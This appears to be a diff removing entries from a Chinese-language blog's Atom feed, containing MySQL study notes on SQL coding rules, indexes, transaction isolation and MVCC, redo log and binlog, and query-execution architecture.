-【建议】分页查询，当limit起点较高时，可先用过滤条件进行过滤。如select a,b,c from t1 limit 10000,20;优化为: select a,b,c from t1 where id&gt;10000 limit 20;。</p>
-
-<h4 id="toc_13">2.2.2 多表连接</h4>
-
-<p>【强制】禁止跨db的join语句。因为这样可以减少模块间耦合，为数据库拆分奠定坚实基础。<br/>
-【强制】禁止在业务的更新类SQL语句中使用join，比如update t1 join t2…。<br/>
-【建议】不建议使用子查询，建议将子查询SQL拆开结合程序多次查询，或使用join来代替子查询。<br/>
-【建议】线上环境，多表join不要超过3个表。<br/>
-【建议】多表连接查询推荐使用别名，且SELECT列表中要用别名引用字段，数据库.表格式，如select a from db1.table1 alias1 where …。<br/>
-【建议】在多表join中，尽量选取结果集较小的表作为驱动表，来join其他表。</p>
-
-<h4 id="toc_14">2.2.3 事务</h4>
-
-<p>【建议】事务中INSERT|UPDATE|DELETE|REPLACE语句操作的行数控制在2000以内，以及WHERE子句中IN列表的传参个数控制在500以内。<br/>
-【建议】批量操作数据时，需要控制事务处理间隔时间，进行必要的sleep，一般建议值5-10秒。<br/>
-【建议】对于有auto_increment属性字段的表的插入操作，并发需要控制在200以内。<br/>
-【强制】程序设计必须考虑“数据库事务隔离级别”带来的影响，包括脏读、不可重复读和幻读。线上建议事务隔离级别为repeatable-read。<br/>
-【建议】事务里包含SQL不超过5个（支付业务除外）。因为过长的事务会导致锁数据较久，MySQL内部缓存、连接消耗过多等雪崩问题。<br/>
-【建议】事务里更新语句尽量基于主键或unique key，如update … where id=XX; 否则会产生间隙锁，内部扩大锁定范围，导致系统性能下降，产生死锁。<br/>
-【建议】尽量把一些典型外部调用移出事务，如调用webservice，访问文件存储等，从而避免事务过长。<br/>
-【建议】对于MySQL主从延迟严格敏感的select语句，请开启事务强制访问主库。</p>
-
-<h4 id="toc_15">2.2.4 排序和分组</h4>
-
-<p>【建议】减少使用order by，和业务沟通能不排序就不排序，或将排序放到程序端去做。order by、group by、distinct这些语句较为耗费CPU，数据库的CPU资源是极其宝贵的。<br/>
-【建议】order by、group by、distinct这些SQL尽量利用索引直接检索出排序好的数据。如where a=1 order by可以利用key(a,b)。<br/>
-【建议】包含了order by、group by、distinct这些查询的语句，where条件过滤出来的结果集请保持在1000行以内，否则SQL会很慢。</p>
-
-<h4 id="toc_16">2.2.5 线上禁止使用的SQL语句</h4>
-
-<p>【高危】禁用update|delete t1 … where a=XX limit XX; 这种带limit的更新语句。因为会导致主从不一致，导致数据错乱。建议加上order by PK。<br/>
-【高危】禁止使用关联子查询，如update t1 set … where name in(select name from user where…);效率极其低下。<br/>
-【强制】禁用procedure、function、trigger、views、event、外键约束。因为他们消耗数据库资源，降低数据库实例可扩展性。推荐都在程序端实现。<br/>
-【强制】禁用insert into …on duplicate key update…在高并发环境下，会造成主从不一致。<br/>
-【强制】禁止联表更新语句，如update t1,t2 where t1.id=t2.id…。</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[04 | 深入浅出索引（上）]]></title>
-    <link href="http://565785929.github.io/16309452975279.html"/>
-    <updated>2021-09-07T00:21:37+08:00</updated>
-    <id>http://565785929.github.io/16309452975279.html</id>
-    <content type="html"><![CDATA[
-<ul>
-<li>
-<a href="#toc_0">什么是索引</a>
-</li>
-<li>
-<a href="#toc_1">索引的常见模型</a>
-<ul>
-<li>
-<a href="#toc_2">哈希表 hash table</a>
-</li>
-<li>
-<a href="#toc_3">有序数组</a>
-</li>
-</ul>
-</li>
-</ul>
-
-
-<blockquote>
-<p>来自MySQL实战45讲</p>
-</blockquote>
-
-<h2 id="toc_0">什么是索引</h2>
-
-<p>索引的出现其实就是为了提高数据查询的效率，就像书的目录一样。</p>
-
-<p>一本500页的书，如果你想快速找到其中的某一个知识点，在不借助目录的情况下，那我估计你可得找一会儿。同样，对于数据库的表而言，索引其实就是它的“目录”。</p>
-
-<h2 id="toc_1">索引的常见模型</h2>
-
-<ul>
-<li>哈希表</li>
-<li>有序数组</li>
-<li>搜索树</li>
-</ul>
-
-<h3 id="toc_2">哈希表 hash table</h3>
-
-<p>哈希表是一种以键-值（key-value）存储数据的结构，我们只要输入待查找的值即key，就可以找到其对应的值即Value。哈希的思路很简单，把值放在数组里，用一个哈希函数把key换算成一个确定的位置，然后把value放在数组的这个位置。</p>
-
-<p>不可避免地，多个key值经过哈希函数的换算，会出现同一个值的情况，这称为哈希碰撞。处理这种情况的一种方法是，拉出一个链表。</p>
-
-<p>假设，你现在维护着一个身份证信息和姓名的表，需要根据身份证号查找对应的名字，这时对应的哈希索引的示意图如下所示：</p>
-
-<p><img src="media/16309452975279/16309958323648.jpg" alt=""/></p>
-
-<p>图中，User2和User4根据身份证号算出来的值都是N，但没关系，后面还跟了一个链表。假设，这时候你要查ID_card_n2对应的名字是什么，处理步骤就是：首先，将ID_card_n2通过哈希函数算出N；然后，按顺序遍历，找到User2。</p>
-
-<p>需要注意的是，图中四个ID_card_n的值并不是递增的，这样做的好处是增加新的User时速度会很快，只需要往后追加。但缺点是，因为不是有序的，所以哈希索引做区间查询的速度是很慢的。</p>
-
-<p>你可以设想下，如果你现在要找身份证号在[ID_card_X, ID_card_Y]这个区间的所有用户，就必须全部扫描一遍了。</p>
-
-<p>所以，哈希表这种结构适用于只有等值查询的场景，比如Memcached及其他一些NoSQL引擎。</p>
-
-<h3 id="toc_3">有序数组</h3>
-
-<p>而有序数组在等值查询和范围查询场景中的性能就都非常优秀。还是上面这个根据身份证号查名字的例子，如果我们使用有序数组来实现的话，示意图如下所示：</p>
-
-<p><img src="media/16309452975279/16310286123200.jpg" alt=""/></p>
-
-<p><img src="media/16309452975279/B+Tree.png" alt="B+Tree"/></p>
-
-<p><a href="https://www.cs.usfca.edu/%7Egalles/visualization/BPlusTree.html">数据结构</a></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[03 | 事务隔离：为什么你改了我还看不见？]]></title>
-    <link href="http://565785929.github.io/16304224326131.html"/>
-    <updated>2021-08-31T23:07:12+08:00</updated>
-    <id>http://565785929.github.io/16304224326131.html</id>
-    <content type="html"><![CDATA[
-<ul>
-<li>
-<a href="#toc_0">隔离性与隔离级别</a>
-<ul>
-<li>
-<a href="#toc_1">脏读</a>
-</li>
-<li>
-<a href="#toc_2">幻读</a>
-</li>
-<li>
-<a href="#toc_3">不可重复读</a>
-</li>
-</ul>
-</li>
-<li>
-<a href="#toc_4">SQL标准的事务隔离级别包括：</a>
-</li>
-<li>
-<a href="#toc_5">案例</a>
-</li>
-<li>
-<a href="#toc_6">事务隔离的实现</a>
-<ul>
-<li>
-<a href="#toc_7">可重复读</a>
-</li>
-<li>
-<a href="#toc_8">事务的启动方式</a>
-</li>
-</ul>
-</li>
-</ul>
-
-
-<blockquote>
-<p>来自MySQL实战45讲</p>
-</blockquote>
-
-<h2 id="toc_0">隔离性与隔离级别</h2>
-
-<p>提到事务，你肯定会想到ACID：</p>
-
-<ul>
-<li>原子性（Atomicity）</li>
-<li>一致性（Consistency）</li>
-<li>隔离性（Isolation）</li>
-<li>持久性（Durability）</li>
-</ul>
-
-<p>今天我们就来说说其中I，也就是“隔离性”。</p>
-
-<p>当数据库上有多个事务同时执行的时候，就可能出现：</p>
-
-<ul>
-<li>脏读（dirty read）</li>
-<li>不可重复读（non-repeatable read）</li>
-<li>幻读（phantom read）</li>
-</ul>
-
-<p>等的问题，为了解决这些问题，就有了“隔离级别”的概念。</p>
-
-<h3 id="toc_1">脏读</h3>
-
-<p>所谓脏读是指一个事务中访问到了另外一个事务未提交的数据</p>
-
-<table>
-<thead>
-<tr>
-<th>事务 1</th>
-<th>事务 2</th>
-</tr>
-</thead>
-
-<tbody>
-<tr>
-<td>begin</td>
-<td>begin</td>
-</tr>
-<tr>
-<td></td>
-<td>update table set age = 10 where id = 1;</td>
-</tr>
-<tr>
-<td>select age from table where id = 1;</td>
-<td></td>
-</tr>
-<tr>
-<td>commit</td>
-<td>rollback</td>
-</tr>
-</tbody>
-</table>
-
-<p>如果 会话2 更新 age 为 10，但是在 commit 之前，会话1 希望得到 age，那么会话1 获得的值就是更新前的值。或者如果会话2 更新了值但是执行了 rollback，而会话 1 拿到的仍是 10。这就是脏读。</p>
-
-<h3 id="toc_2">幻读</h3>
-
-<p>一个事务读取2次，得到的记录条数不一致：</p>
-
-<table>
-<thead>
-<tr>
-<th>事务1</th>
-<th>事务2</th>
-</tr>
-</thead>
-
-<tbody>
-<tr>
-<td>begin</td>
-<td>begin</td>
-</tr>
-<tr>
-<td>select age from table where id &gt; 2;</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>insert into table(id, age) values(5, 10);</td>
-</tr>
-<tr>
-<td></td>
-<td>commit</td>
-</tr>
-<tr>
-<td>select age from table where id &gt; 2;</td>
-<td></td>
-</tr>
-<tr>
-<td>commit</td>
-<td></td>
-</tr>
-</tbody>
-</table>
-
-<p>上图很明显的表示了这个情况，由于在会话 1 之间插入了一个新的值，所以得到的两次数据就不一样了。</p>
-
-<h3 id="toc_3">不可重复读</h3>
-
-<p>一个事务读取同一条记录2次，得到的结果不一致：</p>
-
-<table>
-<thead>
-<tr>
-<th>事务1</th>
-<th>事务2</th>
-</tr>
-</thead>
-
-<tbody>
-<tr>
-<td>begin</td>
-<td>begin</td>
-</tr>
-<tr>
-<td>select age from table where id = 1</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>update table set age = 10 where id = 1;</td>
-</tr>
-<tr>
-<td></td>
-<td>commit</td>
-</tr>
-<tr>
-<td>select age from table where id = 1;</td>
-<td></td>
-</tr>
-<tr>
-<td>commit</td>
-<td></td>
-</tr>
-</tbody>
-</table>
-
-<p>由于在读取中间变更了数据，所以会话 1 事务查询期间的得到的结果就不一样了。</p>
-
-<p>解决方案也就是下文提到的四种隔离级别，他们可以最大程度避免以上三种情况的发生。</p>
-
-<p>在谈隔离级别之前，你首先要知道，你隔离得越严实，效率就会越低。因此很多时候，我们都要在二者之间寻找一个平衡点。</p>
-
-<h2 id="toc_4">SQL标准的事务隔离级别包括：</h2>
-
-<ul>
-<li>读未提交（read uncommitted）是指，一个事务还没提交时，它做的变更就能被别的事务看到。</li>
-<li>读提交（read committed）是指，一个事务提交之后，它做的变更才会被其他事务看到。Oracle数据库默认级别。</li>
-<li>可重复读（repeatable read）是指，一个事务执行过程中看到的数据，总是跟这个事务在启动时看到的数据是一致的。当然在可重复读隔离级别下，未提交变更对其他事务也是不可见的。MySQL数据库默认级别。</li>
-<li>串行化（serializable）是指，顾名思义是对于同一行记录，“写”会加“写锁”，“读”会加“读锁”。当出现读写锁冲突的时候，后访问的事务必须等前一个事务执行完成，才能继续执行。</li>
-</ul>
-
-<table>
-<thead>
-<tr>
-<th>隔离级别</th>
-<th>脏读</th>
-<th>不可重复读</th>
-<th>幻读</th>
-</tr>
-</thead>
-
-<tbody>
-<tr>
-<td>读未提交(Read uncommitted)</td>
-<td>✓</td>
-<td>✓</td>
-<td>✓</td>
-</tr>
-<tr>
-<td>读已提交(Read committed)</td>
-<td>×</td>
-<td>✓</td>
-<td>✓</td>
-</tr>
-<tr>
-<td>可重复读(Repeatable read)</td>
-<td>×</td>
-<td>×</td>
-<td>✓</td>
-</tr>
-<tr>
-<td>串行化(Serializable)</td>
-<td>×</td>
-<td>×</td>
-<td>×</td>
-</tr>
-</tbody>
-</table>
-
-<h2 id="toc_5">案例</h2>
-
-<p>用一个例子说明这几种隔离级别。假设数据表T中只有一列，其中一行的值为1，下面是按照时间顺序执行两个事务的行为。</p>
-
-<blockquote>
-<p>mysql&gt; create table T(c int) engine=InnoDB;<br/>
-mysql&gt; insert into T(c) values(1);</p>
-</blockquote>
-
-<p><img src="media/16304224326131/16306006330934.jpg" alt=""/><br/>
-我们来看看在不同的隔离级别下，事务A会有哪些不同的返回结果，也就是图里面V1、V2、V3的返回值分别是什么。</p>
-
-<ul>
-<li><strong>读未提交</strong>: 若隔离级别是“读未提交”， 则V1的值就是2。这时候事务B虽然还没有提交，但是结果已经被A看到了。因此，V2、V3也都是2。</li>
-<li><strong>读提交</strong>: 若隔离级别是“读提交”，则V1是1，V2的值是2。事务B的更新在提交后才能被A看到。所以， V3的值也是2。</li>
-<li><strong>可重复读</strong>: 若隔离级别是“可重复读”，则V1、V2是1，V3是2。之所以V2还是1，遵循的就是这个要求：事务在执行期间看到的数据前后必须是一致的。</li>
-<li><strong>串行化</strong>: 若隔离级别是“串行化”，则在事务B执行“将1改成2”的时候，会被锁住。直到事务A提交后，事务B才可以继续执行。所以从A的角度看， V1、V2值是1，V3的值是2。</li>
-</ul>
-
-<h2 id="toc_6">事务隔离的实现</h2>
-
-<p>在实现上，数据库里面会创建一个视图，访问的时候以视图的逻辑结果为准。</p>
-
-<ul>
-<li>在“可重复读”隔离级别下，这个视图是在事务启动时创建的，整个事务存在期间都用这个视图。</li>
-<li>在“读提交”隔离级别下，这个视图是在每个SQL语句开始执行的时候创建的。</li>
-<li>这里需要注意的是，“读未提交”隔离级别下直接返回记录上的最新值，没有视图概念；</li>
-<li>而“串行化”隔离级别下直接用加锁的方式来避免并行访问。</li>
-</ul>
-
-<p>我们可以看到在不同的隔离级别下，数据库行为是有所不同的。Oracle数据库的默认隔离级别其实就是“读提交”，因此对于一些从Oracle迁移到MySQL的应用，为保证数据库隔离级别的一致，你一定要记得将MySQL的隔离级别设置为“读提交”。</p>
-
-<p>配置的方式是，将启动参数transaction-isolation的值设置成READ-COMMITTED。你可以用show variables来查看当前的值。</p>
-
-<pre class="line-numbers"><code class="language-sql">MySQL root@(none):(none)&gt; show variables like &#39;transaction_isolation&#39;;
-
-+-----------------------+-----------------+
-| Variable_name         | Value           |
-+-----------------------+-----------------+
-| transaction_isolation | REPEATABLE-READ |
-+-----------------------+-----------------+
-</code></pre>
-
-<h3 id="toc_7">可重复读</h3>
-
-<p>在MySQL中，实际上每条记录在更新的时候都会同时记录一条回滚操作。记录上的最新值，通过回滚操作，都可以得到前一个状态的值。</p>
-
-<p>假设一个值从1被按顺序改成了2、3、4，在回滚日志里面就会有类似下面的记录。</p>
-
-<p><img src="media/16304224326131/16309424534139.jpg" alt=""/></p>
-
-<p>当前值是4，但是在查询这条记录的时候，不同时刻启动的事务会有不同的read-view。如图中看到的，在视图A、B、C里面，这一个记录的值分别是1、2、4，同一条记录在系统中可以存在多个版本，就是数据库的多版本并发控制（MVCC）。对于read-view A，要得到1，就必须将当前值依次执行图中所有的回滚操作得到。</p>
-
-<p>同时你会发现，即使现在有另外一个事务正在将4改成5，这个事务跟read-view A、B、C对应的事务是不会冲突的。</p>
-
-<p>你一定会问，回滚日志总不能一直保留吧，什么时候删除呢？答案是，在不需要的时候才删除。也就是说，系统会判断，当没有事务再需要用到这些回滚日志时，回滚日志会被删除。</p>
-
-<p>什么时候才不需要了呢？就是当系统里没有比这个回滚日志更早的read-view的时候。</p>
-
-<p>基于上面的说明，我们来讨论一下为什么建议你尽量不要使用长事务。</p>
-
-<p>长事务意味着系统里面会存在很老的事务视图。由于这些事务随时可能访问数据库里面的任何数据，所以这个事务提交之前，数据库里面它可能用到的回滚记录都必须保留，这就会导致大量占用存储空间。</p>
-
-<p>在MySQL 5.5及以前的版本，回滚日志是跟数据字典一起放在ibdata文件里的，即使长事务最终提交，回滚段被清理，文件也不会变小。我见过数据只有20GB，而回滚段有200GB的库。最终只好为了清理回滚段，重建整个库。</p>
-
-<p>除了对回滚段的影响，长事务还占用锁资源，也可能拖垮整个库，这个我们会在后面讲锁的时候展开。</p>
-
-<h3 id="toc_8">事务的启动方式</h3>
-
-<p>长事务有潜在风险，应当尽量避免。MySQL的事务启动方式有以下几种：</p>
-
-<ol>
-<li>显式启动事务语句， begin 或 start transaction。配套的提交语句是commit，回滚语句是rollback。</li>
-<li>set autocommit=0，这个命令会将这个线程的自动提交关掉。意味着如果你只执行一个select语句，这个事务就启动了，而且并不会自动提交。这个事务持续存在直到你主动执行commit 或 rollback 语句，或者断开连接。</li>
-</ol>
-
-<p>有些客户端连接框架会默认连接成功后先执行一个<code>set autocommit=0</code>的命令。这就导致接下来的查询都在事务中，如果是长连接，就导致了意外的长事务。</p>
-
-<p>因此，我会建议你总是使用<code>set autocommit=1</code>, 通过显式语句的方式来启动事务。</p>
-
-<p>但是可能会出现“多一次交互”的问题。对于一个需要频繁使用事务的业务，第二种方式每个事务在开始时都不需要主动执行一次 “begin”，减少了语句的交互次数。其实可以使用commit work and chain语法。在autocommit为1的情况下，用begin显式启动的事务，如果执行commit则提交事务。如果执行 commit work and chain，则是提交事务并自动启动下一个事务，这样也省去了再次执行begin语句的开销。同时带来的好处是从程序开发的角度明确地知道每个语句是否处于事务中。</p>
-
-<p>你可以在information_schema库的innodb_trx这个表中查询长事务，比如下面这个语句，用于查找持续时间超过60s的事务。</p>
-
-<pre class="line-numbers"><code class="language-sql">select * from information_schema.innodb_trx where TIME_TO_SEC(timediff(now(), trx_started)) &gt; 60
-</code></pre>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[02 | 日志系统：一条SQL更新语句是如何执行的？]]></title>
-    <link href="http://565785929.github.io/16302079765954.html"/>
-    <updated>2021-08-29T11:32:56+08:00</updated>
-    <id>http://565785929.github.io/16302079765954.html</id>
-    <content type="html"><![CDATA[
-<ul>
-<li>
-<a href="#toc_0">redo log（重做日志）</a>
-</li>
-<li>
-<a href="#toc_1">binlog（归档日志）</a>
-<ul>
-<li>
-<a href="#toc_2">两阶段提交</a>
-</li>
-</ul>
-</li>
-<li>
-<a href="#toc_3">redo log 和 binlog 区别</a>
-</li>
-</ul>
-
-
-<blockquote>
-<p>来自MySQL实战45讲</p>
-</blockquote>
-
-<p>与查询流程不一样的是，更新流程还涉及两个重要的日志模块，它们正是我们今天要讨论的主角：</p>
-
-<h2 id="toc_0">redo log（重做日志）</h2>
-
-<p>redo log为InnoDB特有的日志，用来保证即使数据库发生异常重启，之前提交的记录都不会丢失，这个能力称为crash-safe。</p>
-
-<p>WAL技术，WAL的全称是Write-Ahead Logging，它的关键点就是先写日志，再写磁盘。具体来说，当有一条记录需要更新的时候，InnoDB引擎就会先把记录写到redo log里面，并更新内存，这个时候更新就算完成了。同时，InnoDB引擎会在适当的时候，将这个操作记录更新到磁盘里面，而这个更新往往是在系统比较空闲的时候做。</p>
-
-<p>InnoDB的redo log是固定大小的，比如可以配置为一组4个文件，每个文件的大小是1GB，那么总共就可以记录4GB的操作。从头开始写，写到末尾就又回到开头循环写，如下面这个图所示。</p>
-
-<p><img src="media/16302079765954/16302100687432.jpg" alt=""/></p>
-
-<p>write pos是当前记录的位置，一边写一边后移，写到第3号文件末尾后就回到0号文件开头。checkpoint是当前要擦除的位置，也是往后推移并且循环的，擦除记录前要把记录更新到数据文件。</p>
-
-<p>write pos和checkpoint之间的是空着的部分，可以用来记录新的操作。如果write pos追上checkpoint，表示日志满了，这时候不能再执行新的更新，得停下来先擦掉一些记录，把checkpoint推进一下。</p>
-
-<h2 id="toc_1">binlog（归档日志）</h2>
-
-<p>binlog是MySQL的Server层实现的，所有引擎都可以使用。</p>
-
-<p>有了对这两个日志的概念性理解，我们再来看执行器和InnoDB引擎在执行这个简单的update语句时的内部流程。</p>
-
-<ol>
-<li><p>执行器先找引擎取ID=2这一行。ID是主键，引擎直接用树搜索找到这一行。如果ID=2这一行所在的数据页本来就在内存中，就直接返回给执行器；否则，需要先从磁盘读入内存，然后再返回。</p></li>
-<li><p>执行器拿到引擎给的行数据，把这个值加上1，比如原来是N，现在就是N+1，得到新的一行数据，再调用引擎接口写入这行新数据。</p></li>
-<li><p>引擎将这行新数据更新到内存中，同时将这个更新操作记录到redo log里面，此时redo log处于prepare状态。然后告知执行器执行完成了，随时可以提交事务。</p></li>
-<li><p>执行器生成这个操作的binlog，并把binlog写入磁盘。</p></li>
-<li><p>执行器调用引擎的提交事务接口，引擎把刚刚写入的redo log改成提交（commit）状态，更新完成。</p></li>
-</ol>
-
-<p>这里我给出这个update语句的执行流程图，图中浅色框表示是在InnoDB内部执行的，深色框表示是在执行器中执行的。</p>
-
-<p><img src="media/16302079765954/16302234815627.jpg" alt=""/></p>
-
-<p>你可能注意到了，最后三步看上去有点“绕”，将redo log的写入拆成了两个步骤：prepare和commit，这就是&quot;两阶段提交&quot;。</p>
-
-<h3 id="toc_2">两阶段提交</h3>
-
-<p>binlog会记录所有的逻辑操作，并且是采用“追加写”的形式。当数据库需要恢复到指定的某一秒时，比如某天下午两点发现中午十二点有一次误删表，需要找回数据，那你可以这么做：</p>
-
-<ul>
-<li>首先，找到最近的一次全量备份，如果你运气好，可能就是昨天晚上的一个备份，从这个备份恢复到临时库；</li>
-<li>然后，从备份的时间点开始，将备份的binlog依次取出来，重放到中午误删表之前的那个时刻。</li>
-</ul>
-
-<p>由于redo log和binlog是两个独立的逻辑，如果不用两阶段提交，要么就是先写完redo log再写binlog，或者采用反过来的顺序。我们看看这两种方式会有什么问题。</p>
-
-<p>仍然用前面的update语句来做例子。假设当前ID=2的行，字段c的值是0，再假设执行update语句过程中在写完第一个日志后，第二个日志还没有写完期间发生了crash，会出现什么情况呢？</p>
-
-<ul>
-<li><p>先写redo log后写binlog。假设在redo log写完，binlog还没有写完的时候，MySQL进程异常重启。由于我们前面说过的，redo log写完之后，系统即使崩溃，仍然能够把数据恢复回来，所以恢复后这一行c的值是1。<br/>
-但是由于binlog没写完就crash了，这时候binlog里面就没有记录这个语句。因此，之后备份日志的时候，存起来的binlog里面就没有这条语句。<br/>
-然后你会发现，如果需要用这个binlog来恢复临时库的话，由于这个语句的binlog丢失，这个临时库就会少了这一次更新，恢复出来的这一行c的值就是0，与原库的值不同。</p></li>
-<li><p>先写binlog后写redo log。如果在binlog写完之后crash，由于redo log还没写，崩溃恢复以后这个事务无效，所以这一行c的值是0。但是binlog里面已经记录了“把c从0改成1”这个日志。所以，在之后用binlog来恢复的时候就多了一个事务出来，恢复出来的这一行c的值就是1，与原库的值不同。</p></li>
-</ul>
-
-<p>简单说，redo log和binlog都可以用于表示事务的提交状态，而两阶段提交就是让这两个状态保持逻辑上的一致。</p>
-
-<p>主从库：需要再多搭建一些备库来增加系统的读能力的时候，现在常见的做法也是用全量备份加上应用binlog来实现的。</p>
-
-<p><img src="media/16302079765954/16306001938527.jpg" alt=""/></p>
-
-<h2 id="toc_3">redo log 和 binlog 区别</h2>
-
-<p>这两种日志有以下三点不同。</p>
-
-<ol>
-<li><p>redo log是InnoDB引擎特有的；binlog是MySQL的Server层实现的，所有引擎都可以使用。</p></li>
-<li><p>redo log是物理日志，记录的是“在某个数据页上做了什么修改”；binlog是逻辑日志，记录的是这个语句的原始逻辑，比如“给ID=2这一行的c字段加1 ”。</p></li>
-<li><p>redo log是循环写的，空间固定会用完；binlog是可以追加写入的。“追加写”是指binlog文件写到一定大小后会切换到下一个，并不会覆盖以前的日志。</p></li>
-</ol>
-
-<p>redo log用于保证crash-safe能力。innodb_flush_log_at_trx_commit这个参数设置成1的时候，表示每次事务的redo log都直接持久化到磁盘。这个参数我建议你设置成1，这样可以保证MySQL异常重启之后数据不丢失。</p>
-
-<p>sync_binlog这个参数设置成1的时候，表示每次事务的binlog都持久化到磁盘。这个参数我也建议你设置成1，这样可以保证MySQL异常重启之后binlog不丢失。</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[01 | 基础架构：一条SQL查询语句是如何执行的？]]></title>
-    <link href="http://565785929.github.io/16301414327814.html"/>
-    <updated>2021-08-28T17:03:52+08:00</updated>
-    <id>http://565785929.github.io/16301414327814.html</id>
-    <content type="html"><![CDATA[
-<ul>
-<li>
-<a href="#toc_0">Server层</a>
-<ul>
-<li>
-<a href="#toc_1">连接器</a>
-</li>
-<li>
-<a href="#toc_2">查询缓存</a>
-</li>
-<li>
-<a href="#toc_3">分析器</a>
-</li>
-<li>
-<a href="#toc_4">优化器</a>
-</li>
-<li>
-<a href="#toc_5">执行器</a>
-</li>
-</ul>
-</li>
-<li>
-<a href="#toc_6">存储引擎</a>
-</li>
-</ul>
-
-
-<blockquote>
-<p>来自MySQL实战45讲</p>
-</blockquote>
-
-<p><strong>MySQL的逻辑架构图</strong><br/>
-<img src="media/16301414327814/16301415100109.jpg" alt=""/></p>
-
-<p>大体来说，MySQL可以分为Server层和存储引擎层两部分。</p>
-
-<h2 id="toc_0">Server层</h2>
-
-<p>包括连接器、查询缓存、分析器、优化器、执行器等，涵盖MySQL的大多数核心服务功能，以及所有的内置函数（如日期、时间、数学和加密函数等），所有跨存储引擎的功能都在这一层实现，比如存储过程、触发器、视图等。</p>
-
-<h3 id="toc_1">连接器</h3>
-
-<p>第一步，你会先连接到这个数据库上，这时候接待你的就是连接器。连接器负责跟客户端建立连接、获取权限、维持和管理连接。连接命令一般是这么写的：</p>
-
-<pre class="line-numbers"><code class="language-text">mysql -h$ip -P$port -u$user -p
-</code></pre>
-
-<p>连接命令中的mysql是客户端工具，用来跟服务端建立连接。在完成经典的TCP握手后，连接器就要开始认证你的身份，这个时候用的就是你输入的用户名和密码。</p>
-
-<ul>
-<li>如果用户名或密码不对，你就会收到一个&quot;Access denied for user&quot;的错误，然后客户端程序结束执行。</li>
-<li>如果用户名密码认证通过，连接器会到权限表里面查出你拥有的权限。之后，这个连接里面的权限判断逻辑，都将依赖于此时读到的权限。</li>
-</ul>
-
-<p>这就意味着，一个用户成功建立连接后，即使你用管理员账号对这个用户的权限做了修改，也不会影响已经存在连接的权限。修改完成后，只有再新建的连接才会使用新的权限设置。</p>
-
-<p>连接完成后，如果你没有后续的动作，这个连接就处于空闲状态，你可以在<code>SHOW PROCESSLIST;</code>命令中看到它。</p>
-
-<p>文本中这个图是show processlist的结果.</p>
-
-<p><img src="media/16301414327814/16301432706534.jpg" alt="" style="width:572px;"/></p>
-
-<p>其中的Command列显示为“Sleep”的这一行，就表示现在系统里面有一个空闲连接。<br/>
-其中的Command列显示为“Query”的这一行，就表示当前正在运行<code>SHOW PROCESSLIST;</code>的连接。</p>
-
-<p>客户端如果太长时间没动静，连接器就会自动将它断开。这个时间是由参数wait_timeout控制的，默认值是8小时。可以通过<code>SHOW VARIABLES LIKE &#39;wait_timeout&#39;;</code>或<code>SELECT @@wait_timeout;</code>命令查看。<br/>
-<img src="media/16301414327814/16301437610835.jpg" alt="" style="width:307px;"/></p>
-
-<p>如果在连接被断开之后，客户端再次发送请求的话，就会收到一个错误提醒： </p>
-
-<blockquote>
-<p>Lost connection to MySQL server during query。</p>
-</blockquote>
-
-<p>这时候如果你要继续，就需要重连，然后再执行请求了。建立连接的过程通常是比较复杂的，尽量使用长连接。</p>
-
-<p>但是全部使用长连接后，有些时候MySQL占用内存涨得特别快，这是因为MySQL在执行过程中临时使用的内存是管理在连接对象里面的。这些资源会在连接断开的时候才释放。所以如果长连接累积下来，可能导致内存占用太大，被系统强行杀掉（OOM），从现象看就是MySQL异常重启了。</p>
-
-<p><strong>怎么解决长连接消耗太多内存呢？你可以考虑以下两种方案。</strong></p>
-
-<ol>
-<li><p>定期断开长连接。使用一段时间，或者程序里面判断执行过一个占用内存的大查询后，断开连接，之后要查询再重连。</p></li>
-<li><p>如果你用的是MySQL 5.7或更新版本，可以在每次执行一个比较大的操作后，通过执行 mysql_reset_connection来重新初始化连接资源。这个过程不需要重连和重新做权限验证，但是会将连接恢复到刚刚创建完时的状态。</p></li>
-</ol>
-
-<h3 id="toc_2">查询缓存</h3>
-
-<p>连接建立完成后，你就可以执行select语句了。执行逻辑就会来到第二步：查询缓存。</p>
-
-<p>MySQL拿到一个查询请求后，会先到查询缓存看看，之前是不是执行过这条语句。之前执行过的语句及其结果可能会以key-value对的形式，被直接缓存在内存中。key是查询的语句，value是查询的结果。如果你的查询能够直接在这个缓存中找到key，那么这个value就会被直接返回给客户端。</p>
-
-<p>如果语句不在查询缓存中，就会继续后面的执行阶段。执行完成后，执行结果会被存入查询缓存中。你可以看到，如果查询命中缓存，MySQL不需要执行后面的复杂操作，就可以直接返回结果，这个效率会很高。</p>
-
-<p>但是查询缓存往往弊大于利，查询缓存的失效非常频繁，只要有对一个表的更新，这个表上所有的查询缓存都会被清空。因此很可能你费劲地把结果存起来，还没使用呢，就被一个更新全清空了。对于更新压力大的数据库来说，查询缓存的命中率会非常低。除非你的业务就是有一张静态表，很长时间才会更新一次。比如，一个系统配置表，那这张表上的查询才适合使用查询缓存。</p>
-
-<p>好在MySQL也提供了这种“按需使用”的方式。你可以将参数query_cache_type设置成DEMAND，这样对于默认的SQL语句都不使用查询缓存。而对于你确定要使用查询缓存的语句，可以用SQL_CACHE显式指定，像下面这个语句一样：</p>
-
-<pre class="line-numbers"><code class="language-sql">mysql&gt; select SQL_CACHE * from T where ID=10；
-</code></pre>
-
-<p>需要注意的是，MySQL 8.0版本直接将查询缓存的整块功能删掉了，也就是说8.0开始彻底没有这个功能了。</p>
-
-<h3 id="toc_3">分析器</h3>
-
-<p>如果没有命中查询缓存，就要开始真正执行语句了。首先，MySQL需要知道你要做什么，因此需要对SQL语句做解析。</p>
-
-<p>分析器先会做“词法分析”。你输入的是由多个字符串和空格组成的一条SQL语句，MySQL需要识别出里面的字符串分别是什么，代表什么。</p>
-
-<p>然后做“语法分析”。根据词法分析的结果，语法分析器会根据语法规则，判断你输入的这个SQL语句是否满足MySQL语法。</p>
-
-<p>如果你的语句不对，就会收到类似如下错误提醒：</p>
-
-<blockquote>
-<p>ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;elect * from t where ID=1&#39; at line 1</p>
-</blockquote>
-
-<p>一般语法错误会提示第一个出现错误的位置，所以你要关注的是紧接“use near”的内容。</p>
-
-<h3 id="toc_4">优化器</h3>
-
